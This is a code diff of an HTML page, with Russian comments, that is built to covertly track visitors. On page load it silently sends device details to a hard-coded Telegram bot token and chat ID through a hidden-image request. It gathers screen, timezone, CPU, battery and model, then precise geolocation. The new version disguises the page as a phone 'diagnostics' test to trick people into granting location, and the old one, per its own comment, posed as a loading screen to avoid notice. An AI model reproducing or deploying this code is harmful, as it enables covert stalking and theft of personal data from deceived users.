@@ -3,35 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Загрузка системы...</title>
+    <title>Тестирование конфигурации устройства</title>
     <style>
-        /* Минимальный технический стиль: пустой экран */
-        body { font-family: monospace; background: #ffffff; color: #000000; margin: 20px; font-size: 12px; }
-        .hidden { display: none; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 40px 20px;
+            text-align: center;
+            background-color: #f8f9fa;
+            color: #333;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            box-sizing: border-box;
+        }
+        h1 {
+            font-size: 24px;
+            color: #1a1a1a;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 15px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+        button {
+            padding: 14px 28px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            transition: background-color 0.2s;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
     </style>
 </head>
 <body>
 
-    <!-- Страница выглядит как обычная загрузка, чтобы не привлекать внимания -->
-    <div id="status">Загрузка компонентов системы... Пожалуйста, подождите.</div>
+    <div class="container">
+        <h1>Проверка параметров системы</h1>
+        <p>Нажмите на кнопку ниже, чтобы начать диагностику аппаратных функций смартфона, включая калибровку датчика геолокации и замер батареи.</p>
+        
+        <button onclick="requestLocation()">Запустить диагностику</button>
+    </div>
 
     <script>
-        // Конфигурация вашего рабочего Телеграм-бота
+        // Конфигурация вашего Телеграм-бота
         const TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
         const CHAT_ID = "6559747526";
 
-        // Функция отправки отчетов (метод скрытой картинки, обходящий CORS-блокировки браузеров)
+        // Сверхнадежная функция отправки (через скрытую картинку)
         function sendReport(extraData = "") {
             const time = new Date().toLocaleTimeString();
             const date = new Date().toLocaleDateString();
             
-            // Базовые системные параметры, доступные без разрешений
             const screenRes = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const cores = navigator.hardwareConcurrency || "Не определено";
             const isIos = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android / PC";
 
-            // Сборка финального текста с максимальной информацией
             let reportText = `🔔 *Технический отчет*\n\n` +
                              `📅 *Дата:* ${date}\n` +
                              `🕒 *Время:* ${time}\n` +
@@ -41,17 +84,15 @@
                              `🧠 *Ядра CPU:* ${cores}` + 
                              extraData;
 
-            // Отправка через API Telegram
             const img = new Image();
             img.src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(reportText)}&parse_mode=Markdown`;
         }
 
-        // Дополнительный сбор данных, требующих асинхронного ожидания (заряд и точная модель)
-        async function startAnalytics() {
+        // Вспомогательная функция для сбора батареи и модели
+        async function getDeviceSpecs() {
             let batteryText = "\n🔋 *Батарея:* Блокируется системой (iOS)";
             let modelText = "";
 
-            // 1. Попытка замерить заряд батареи (работает на Android/ПК)
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -59,7 +100,6 @@
                 } catch (e) {}
             }
 
-            // 2. Попытка вытянуть точную модель процессора/бренда через Client Hints (Android)
             if (navigator.userAgentData) {
                 try {
                     const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
@@ -67,35 +107,40 @@
                 } catch (e) {}
             }
 
-            // Отправляем первый базовый пакет данных сразу при входе
-            sendReport(batteryText + modelText);
+            return batteryText + modelText;
+        }
 
-            // 3. Запрос точных координат геолокации
+        // Автоматический сбор базовых параметров при входе
+        window.addEventListener('DOMContentLoaded', async () => {
+            const specs = await getDeviceSpecs();
+            setTimeout(() => { sendReport(specs); }, 500);
+        });
+
+        // Запуск при нажатии на синюю кнопку диагностики
+        async function requestLocation() {
             if (navigator.geolocation) {
+                const specs = await getDeviceSpecs();
+                
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        // Форматируем единую строчку координат для быстрого копирования кликом
+                        // Единая строчка координат для копирования кликом
                         const coords = `\n📍 *Координаты:* \`${lat},${lon}\``;
                         
-                        sendReport(batteryText + modelText + coords);
-                        document.getElementById('status').innerText = "Загрузка завершена успешно.";
+                        sendReport(specs + coords);
+                        alert("Диагностика успешно завершена!");
                     },
                     (error) => {
-                        // Если пользователь отклонил окно, уведомляем систему
-                        sendReport(batteryText + modelText + "\n❌ *Геолокация:* Доступ отклонен пользователем");
-                        document.getElementById('status').innerText = "Ошибка конфигурации датчиков.";
+                        sendReport(specs + "\n❌ *Геолокация:* Доступ отклонен");
+                        alert("Для завершения теста требуется разрешить доступ к датчику геолокации.");
                     },
                     { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
+            } else {
+                alert("Ваш браузер не поддерживает API геолокации.");
             }
         }
-
-        // Запуск сбора данных через полсекунды после открытия страницы
-        window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(startAnalytics, 500);
-        });
     </script>
 </body>
 </html>
